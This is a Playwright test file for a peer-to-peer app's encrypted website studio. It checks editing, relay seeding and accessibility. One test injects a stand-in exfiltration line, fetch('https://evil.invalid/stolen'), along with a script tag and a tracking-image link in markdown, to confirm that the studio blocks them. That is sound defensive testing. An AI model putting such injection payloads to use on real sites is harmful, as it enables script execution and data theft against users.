import { test, expect, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { mkdirSync, writeFileSync } from "node:fs";
import { uiHost } from "./app-host";
let host: Awaited<ReturnType<typeof uiHost>>;
const password = "frase sintética do estúdio de sites";
test.beforeAll(async () => {
  host = await uiHost();
});
test.afterAll(async () => {
  await host.close();
});
async function nav(p: Page, name: string) {
  const button = p.getByRole("button", { name, exact: true });
  if (!(await button.isVisible()))
    await p
      .getByRole("button", { name: "Abrir navegação", exact: true })
      .click();
  await button.click();
}
async function enter(p: Page, name: string) {
  await p.goto(host.url + "/browser/index.html");
  await p.getByRole("button", { name: "Começar", exact: true }).click();
  await p.getByLabel("Como te chamas?").fill(name);
  await p.getByLabel("Frase-passe", { exact: true }).fill(password);
  await p
    .getByRole("button", { name: "Criar identidade", exact: true })
    .click();
  await expect(
    p.getByRole("heading", { name: "As tuas conversas" }),
  ).toBeVisible();
}
async function connect(a: Page, b: Page) {
  for (const p of [a, b]) {
    await nav(p, "A rede");
    await p.getByRole("button", { name: "Ligar um par", exact: true }).click();
  }
  await a.getByRole("button", { name: "Criar código de ligação" }).click();
  await b.getByRole("tab", { name: "Receber código" }).click();
  await b
    .getByLabel("Código de ligação recebido")
    .fill(await a.getByLabel("Código para partilhar").inputValue());
  await b.getByRole("button", { name: "Criar resposta", exact: true }).click();
  await a
    .getByLabel("Resposta do outro dispositivo")
    .fill(await b.getByLabel("Código para partilhar").inputValue());
  await a.getByRole("button", { name: "Concluir ligação" }).click();
  for (const p of [a, b]) {
    await expect(
      p.getByText("Ligação estabelecida. Já podem trocar conteúdo."),
    ).toBeVisible();
    await p
      .getByRole("dialog")
      .getByRole("button", { name: "Fechar", exact: true })
      .click();
  }
}
async function audit(p: Page, path: string) {
  const result = await new AxeBuilder({ page: p })
    .withTags(["wcag2a", "wcag2aa", "wcag21aa"])
    .analyze();
  writeFileSync(
    path + "-axe.json",
    JSON.stringify(
      { violations: result.violations, passes: result.passes.length },
      null,
      2,
    ),
  );
  expect(result.violations).toEqual([]);
  expect(
    await p.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
  ).toBe(true);
  await p.screenshot({ path: path + ".png", fullPage: true });
  await p.screenshot({ path: path + "-viewport.png" });
}
test("multipage studio saves encrypted draft, rejects executable imports and a consenting reader seeds it to a new browser after author closes", async ({
  browser,
}, info) => {
  const ca = await browser.newContext({ locale: "pt-PT" }),
    cb = await browser.newContext({ locale: "pt-PT" }),
    cc = await browser.newContext({ locale: "pt-PT" });
  const a = await ca.newPage(),
    b = await cb.newPage(),
    c = await cc.newPage();
  const output = `.cache/site-studio/ui-${info.project.name || "chromium"}`;
  mkdirSync(output, { recursive: true });
  const requests: string[] = [];
  for (const p of [a, b, c]) p.on("request", (r) => requests.push(r.url()));
  try {
    await enter(a, "Alice estúdio");
    await enter(b, "Bruno leitor");
    await nav(a, "Definições");
    const card = await a
      .getByLabel("Cartão público da identidade")
      .inputValue();
    await b
      .getByRole("button", { name: "Adicionar contacto", exact: true })
      .click();
    await b.getByLabel("Cartão público do contacto").fill(card);
    await b.getByRole("button", { name: "Verificar e adicionar" }).click();
    await expect(b.getByRole("dialog")).toHaveCount(0);

    await connect(a, b);
    await nav(a, "A praça");
    await a
      .getByRole("button", { name: "Partilhar algo", exact: true })
      .click();
    await a
      .getByLabel("A tua publicação")
      .fill("Uma publicação para o diário integrado.");
    await a.getByRole("button", { name: "Publicar", exact: true }).click();
    await nav(a, "A minha página");
    const studio = a.getByRole("region", { name: "Estúdio do site" });
    await studio.getByRole("tab", { name: "Modelos", exact: true }).click();
    await studio.getByRole("button", { name: /Portefólio visual/ }).click();
    await expect(studio.getByLabel("Nome da página")).toHaveValue("Início");
    await studio.getByRole("tab", { name: "Estilo", exact: true }).click();
    await studio
      .getByLabel("Nome do site", { exact: true })
      .fill("Atlas pessoal de Alice");
    await studio
      .getByLabel("Tipografia", { exact: true })
      .selectOption("serif");
    await studio
      .getByLabel("Título do bloco 1", { exact: true })
      .fill("Ideias que ficam entre nós.");
    await studio
      .getByRole("button", { name: "Desfazer alteração do site" })
      .click();
    await expect(
      studio.getByLabel("Título do bloco 1", { exact: true }),
    ).toHaveValue("Ideias que ganham forma.");
    await studio
      .getByRole("button", { name: "Refazer alteração do site" })
      .click();
    const gallery = studio.locator(".studio-stage .gallery.editable");
    await gallery.locator('input[aria-label^="Título"]').click();
    await studio.getByLabel("Adicionar imagens ao site").setInputFiles({
      name: "pixel-do-site.png",
      mimeType: "image/png",
      buffer: Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNQqCr4DwAD0gIKZKEF0gAAAABJRU5ErkJggg==",
        "base64",
      ),
    });
    await studio
      .getByLabel("Descrição da imagem 1", { exact: true })
      .fill("Imagem de ensaio incluída no site");
    await studio
      .getByRole("button", { name: "Fechar propriedades do bloco" })
      .click();
    await studio
      .getByRole("button", { name: "Guardar rascunho", exact: true })
      .click();
    await expect(studio.getByRole("status")).toContainText("Rascunho cifrado");
    await a.reload();
    await a.getByLabel("Frase-passe", { exact: true }).fill(password);
    await a.getByRole("button", { name: "Entrar na minha rede" }).click();
    await expect(
      a.getByRole("heading", { name: "As tuas conversas" }),
    ).toBeVisible();
    await nav(a, "A minha página");
    await expect(
      studio.getByLabel("Título do bloco 1", { exact: true }),
    ).toHaveValue("Ideias que ficam entre nós.");
    await studio.getByRole("tab", { name: "Avançado", exact: true }).click();
    const exported = JSON.parse(
      await studio.getByLabel("Projecto declarativo").inputValue(),
    );
    expect(exported.site.pages).toHaveLength(2);
    expect(exported.attachments[0].data.length).toBeGreaterThan(0);
    exported.site.javascript = 'fetch("https://evil.invalid/stolen")';
    await studio
      .getByLabel("Projecto declarativo")
      .fill(JSON.stringify(exported));
    await studio.getByRole("button", { name: "Validar e aplicar" }).click();
    await expect(studio.getByRole("alert")).toContainText("Site inválido");
    await expect(
      studio.getByLabel("Título do bloco 1", { exact: true }),
    ).toHaveValue("Ideias que ficam entre nós.");
    delete exported.site.javascript;
    exported.site.pages[0].blocks[2].media.push({
      attachment: 0,
      alt: "Segunda utilização da mesma imagem",
    });
    exported.site.pages[1].blocks.push({
      id: "live-posts",
      type: "posts",
      title: "Diário de Alice",
      body: "",
      limit: 3,
    });
    exported.site.pages[1].blocks[1].format = "markdown";
    exported.site.pages[1].blocks[1].body =
      "**Texto com formato**\n\n<script>window.SITE_EXECUTED=true</script>\n\n![não carregar](https://evil.invalid/pixel)";
    await studio
      .getByLabel("Projecto declarativo")
      .fill(JSON.stringify(exported));
    await studio.getByRole("button", { name: "Validar e aplicar" }).click();
    await expect(studio.getByRole("status")).toContainText("Projecto validado");
    await studio.getByRole("tab", { name: "Blocos", exact: true }).click();
    await audit(a, output + "/editor");
    await studio
      .getByRole("button", { name: "Pré-visualizar", exact: true })
      .click();
    await expect(
      studio.getByRole("img", { name: "Imagem de ensaio incluída no site" }),
    ).toBeVisible();
    await studio
      .getByRole("img", { name: "Imagem de ensaio incluída no site" })
      .scrollIntoViewIfNeeded();
    await expect
      .poll(() =>
        studio
          .getByRole("img", { name: "Imagem de ensaio incluída no site" })
          .evaluate((e: HTMLImageElement) => e.naturalWidth),
      )
      .toBe(1);
    expect(
      await studio
        .getByRole("img", { name: "Segunda utilização da mesma imagem" })
        .getAttribute("src"),
    ).toBe(
      await studio
        .getByRole("img", { name: "Imagem de ensaio incluída no site" })
        .getAttribute("src"),
    );
    await studio
      .getByRole("button", { name: /Conhece o meu percurso/ })
      .click();
    await expect(
      studio.getByText("Texto com formato", { exact: true }),
    ).toBeVisible();
    await expect(
      studio.getByText("Uma publicação para o diário integrado.", {
        exact: true,
      }),
    ).toBeVisible();
    expect(
      await a.evaluate(() => (window as any).SITE_EXECUTED),
    ).toBeUndefined();
    expect(requests.some((u) => u.includes("evil.invalid"))).toBe(false);
    await studio
      .getByRole("navigation", { name: "Páginas do site" })
      .getByRole("button", { name: "Início", exact: true })
      .click();
    await audit(a, output + "/preview");
    await a.setViewportSize({ width: 390, height: 844 });
    await audit(a, output + "/mobile-preview");
    await a.setViewportSize({ width: 1440, height: 1000 });
    await connect(a, b);
    await nav(a, "A minha página");
    await studio
      .getByRole("button", { name: "Publicar página", exact: true })
      .click();
    await expect(studio.getByRole("status")).toContainText("Página assinada");
    await nav(b, "A praça");
    await expect(
      b.getByRole("button", { name: "Ver página de Alice estúdio" }),
    ).toBeVisible();
    await ca.close();
    await b
      .getByRole("button", { name: "Ver página de Alice estúdio" })
      .click();
    const dialog = b.getByRole("dialog");
    await expect(
      dialog.getByRole("heading", { name: "Ideias que ficam entre nós." }),
    ).toBeVisible();
    await expect(
      dialog.getByRole("img", { name: "Imagem de ensaio incluída no site" }),
    ).toBeVisible();
    await dialog
      .getByRole("button", { name: /Conhece o meu percurso/ })
      .click();
    await expect(
      dialog.getByText("Texto com formato", { exact: true }),
    ).toBeVisible();
    await expect(
      dialog.getByText("Uma publicação para o diário integrado.", {
        exact: true,
      }),
    ).toBeVisible();
    expect(
      await b.evaluate(() => (window as any).SITE_EXECUTED),
    ).toBeUndefined();
    expect(requests.some((u) => u.includes("evil.invalid"))).toBe(false);
    await audit(b, output + "/reader-author-offline");
    await dialog.getByRole("button", { name: "Fechar", exact: true }).click();
    await enter(c, "Clara nova leitora");
    await c
      .getByRole("button", { name: "Adicionar contacto", exact: true })
      .click();
    await c.getByLabel("Cartão público do contacto").fill(card);
    await c.getByRole("button", { name: "Verificar e adicionar" }).click();
    await expect(c.getByRole("dialog")).toHaveCount(0);
    // Inventory synchronisation is opt-in at both ends; C is a fresh consenting
    // installation, while B remains paused for the negative control below.
    await nav(c, "A rede");
    await c
      .getByRole("region", { name: "Ajudar a rede", exact: true })
      .getByRole("checkbox", { name: "Permitir retransmissão" })
      .check();
    await connect(b, c);
    await nav(c, "A praça");
    await nav(b, "A rede");
    const relay = b.getByRole("region", { name: "Ajudar a rede", exact: true });
    await expect(
      relay.getByRole("checkbox", { name: "Permitir retransmissão" }),
    ).not.toBeChecked();
    for (let i = 0; i < 3; i++) {
      await new Promise((done) => setTimeout(done, 1000));
      await expect(
        c.getByRole("button", { name: "Ver página de Alice estúdio" }),
      ).toHaveCount(0);
    }
    await relay
      .getByRole("checkbox", { name: "Permitir retransmissão" })
      .check();
    await c
      .getByRole("button", { name: "Ver página de Alice estúdio" })
      .click();
    const third = c.getByRole("dialog");
    await expect(
      third.getByRole("heading", { name: "Ideias que ficam entre nós." }),
    ).toBeVisible();
    const seededImage = third.getByRole("img", {
      name: "Imagem de ensaio incluída no site",
    });
    await seededImage.scrollIntoViewIfNeeded();
    await expect
      .poll(() => seededImage.evaluate((e: HTMLImageElement) => e.naturalWidth))
      .toBe(1);
    await third.getByRole("button", { name: /Conhece o meu percurso/ }).click();
    await expect(
      third.getByText("Texto com formato", { exact: true }),
    ).toBeVisible();
    expect(a.isClosed()).toBe(true);
    expect(
      await c.evaluate(() => (window as any).SITE_EXECUTED),
    ).toBeUndefined();
    expect(requests.some((u) => u.includes("evil.invalid"))).toBe(false);
    await audit(c, output + "/third-reader");
  } finally {
    await ca.close();
    await cb.close();
    await cc.close();
  }
});

test("studio keyboard navigation, nested drag, duplicate, reparent and page references stay editable on a narrow screen", async ({
  page,
}, info) => {
  await enter(page, "Composição por teclado");
  await nav(page, "A minha página");
  const studio = page.getByRole("region", { name: "Estúdio do site" });
  await studio.getByRole("tab", { name: "Blocos", exact: true }).focus();
  await page.keyboard.press("ArrowRight");
  await expect(
    studio.getByRole("tab", { name: "Estilo", exact: true }),
  ).toBeFocused();
  await page.keyboard.press("ArrowRight");
  await expect(
    studio.getByRole("tab", { name: "Modelos", exact: true }),
  ).toBeFocused();
  await studio.getByRole("button", { name: /Portefólio visual/ }).click();
  await studio
    .locator(".studio-pages")
    .getByRole("button", { name: /Sobre/ })
    .click();
  await studio
    .getByRole("button", { name: "Eliminar página seleccionada" })
    .click();
  await expect(studio.getByRole("alert")).toContainText(
    "Remove primeiro as ligações",
  );
  await studio
    .getByRole("button", { name: "Adicionar página ao site" })
    .click();
  await studio.getByLabel("Nome da página").fill("Arquivo");
  await studio.getByLabel("Endereço da página").fill("arquivo");
  await studio
    .getByRole("button", { name: "Duplicar bloco 1", exact: true })
    .click();
  await expect(studio.locator(".studio-stage .hero.editable")).toHaveCount(2);
  await studio
    .getByRole("button", { name: "Eliminar bloco 2", exact: true })
    .click();
  await studio.getByRole("tab", { name: "Blocos", exact: true }).click();
  await studio
    .getByRole("tabpanel")
    .getByRole("button", { name: "Colunas", exact: true })
    .click();
  await studio
    .locator(".studio-stage .hero.editable")
    .dragTo(studio.locator(".studio-stage .columns.editable"));
  await expect(studio.locator(".studio-columns > .hero.editable")).toHaveCount(
    1,
  );
  await studio.getByLabel("Título do bloco 2", { exact: true }).click();
  await studio.getByLabel("Mover para composição").selectOption("");
  await expect(studio.locator(".studio-columns > .hero.editable")).toHaveCount(
    0,
  );
  await studio
    .getByRole("button", { name: "Mover bloco 2 para cima", exact: true })
    .focus();
  await page.keyboard.press("Enter");
  await expect(studio.locator(".studio-stage .editable").first()).toHaveClass(
    /hero/,
  );
  await studio
    .getByRole("button", { name: "Fechar propriedades do bloco" })
    .click();
  await studio
    .getByRole("button", { name: "Guardar rascunho", exact: true })
    .click();
  await expect(studio.getByRole("status")).toContainText("Rascunho cifrado");
  await page.setViewportSize({ width: 390, height: 844 });
  const output = `.cache/site-studio/ui-${info.project.name || "chromium"}`;
  mkdirSync(output, { recursive: true });
  await audit(page, output + "/mobile-editor");
});

test("dense three-level compositions keep all controls inside their blocks and preserve contrast across palettes and app themes", async ({
  page,
}, info) => {
  await enter(page, "Composições densas");
  await nav(page, "A minha página");
  const studio = page.getByRole("region", { name: "Estúdio do site" });
  await studio.getByRole("tab", { name: "Avançado", exact: true }).click();
  const project = JSON.parse(
    await studio.getByLabel("Projecto declarativo").inputValue(),
  );
  project.site.pages[0].blocks = [
    {
      id: "outer",
      type: "columns",
      title: "Composição principal",
      body: "",
      style: { columns: 3 },
      children: Array.from({ length: 3 }, (_, i) => ({
        id: "column-" + i,
        type: "columns",
        title: i ? "Coluna " + (i + 1) : "",
        body: "",
        style: { columns: 3 },
        children: Array.from({ length: 3 }, (_, j) => ({
          id: `leaf-${i}-${j}`,
          type: "callout",
          title: `Uma ideia ${i + 1}.${j + 1}`,
          body: j ? "Texto de uma composição com três níveis." : "",
        })),
      })),
    },
  ];
  await studio.getByLabel("Projecto declarativo").fill(JSON.stringify(project));
  await studio.getByRole("button", { name: "Validar e aplicar" }).click();
  await studio.getByRole("tab", { name: "Blocos", exact: true }).click();
  await expect(studio.locator(".studio-stage .editable")).toHaveCount(13);
  const output = `.cache/site-studio/ui-${info.project.name || "chromium"}`;
  mkdirSync(output, { recursive: true });
  const measurements = [];
  for (const width of [1440, 1100, 720, 390]) {
    await page.setViewportSize({ width, height: 1000 });
    const bad = await studio
      .locator(".studio-node .block-controls button")
      .evaluateAll((buttons) =>
        buttons.flatMap((button) => {
          const box = button.getBoundingClientRect(),
            block = button.closest(".studio-node")!.getBoundingClientRect();
          return box.left < block.left - 1 || box.right > block.right + 1
            ? [
                {
                  label: button.getAttribute("aria-label"),
                  button: { left: box.left, right: box.right },
                  block: { left: block.left, right: block.right },
                },
              ]
            : [];
        }),
      );
    measurements.push({ width, bad });
    expect.soft(bad, "editing controls contained at " + width).toEqual([]);
    expect
      .soft(
        await page.evaluate(
          () => document.documentElement.scrollWidth <= innerWidth,
        ),
      )
      .toBe(true);
  }
  writeFileSync(
    output + "/dense-layout.json",
    JSON.stringify(measurements, null, 2),
  );
  for (const theme of ["light", "dark"]) {
    if ((await page.locator("html").getAttribute("data-theme")) !== theme)
      await page
        .getByRole("button", { name: "Alternar tema", exact: true })
        .click();
    await expect(page.locator("html")).toHaveAttribute("data-theme", theme);
    for (const palette of ["sand", "forest", "ink"]) {
      await studio.getByLabel("Paleta da página").selectOption(palette);
      const placeholder = studio.getByLabel("Título do bloco 2", {
        exact: true,
      });
      await placeholder.scrollIntoViewIfNeeded();
      // Axe can omit empty/offscreen form text. Measure the actual placeholder
      // against this opaque site surface, including its CSS alpha/opacity.
      await expect
        .poll(
          () =>
            placeholder.evaluate((input) => {
              const style = getComputedStyle(input, "::placeholder");
              const rgb = (v: string) => v.match(/[\d.]+/g)!.map(Number);
              const fg = rgb(style.color),
                bg = rgb(
                  getComputedStyle(input.closest(".studio-surface")!)
                    .backgroundColor,
                );
              const alpha = (fg[3] ?? 1) * Number(style.opacity);
              const blend = fg
                .slice(0, 3)
                .map((n, i) => n * alpha + bg[i] * (1 - alpha));
              const luminance = (c: number[]) =>
                c
                  .slice(0, 3)
                  .map((v) => v / 255)
                  .map((v) =>
                    v <= 0.04045 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4,
                  )
                  .reduce(
                    (sum, v, i) => sum + v * [0.2126, 0.7152, 0.0722][i],
                    0,
                  );
              const a = luminance(blend),
                b = luminance(bg);
              return (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05);
            }),
          { message: `placeholder contrast: ${theme}/${palette}` },
        )
        .toBeGreaterThanOrEqual(4.5);
      await audit(page, output + `/dense-${theme}-${palette}`);
    }
  }
});
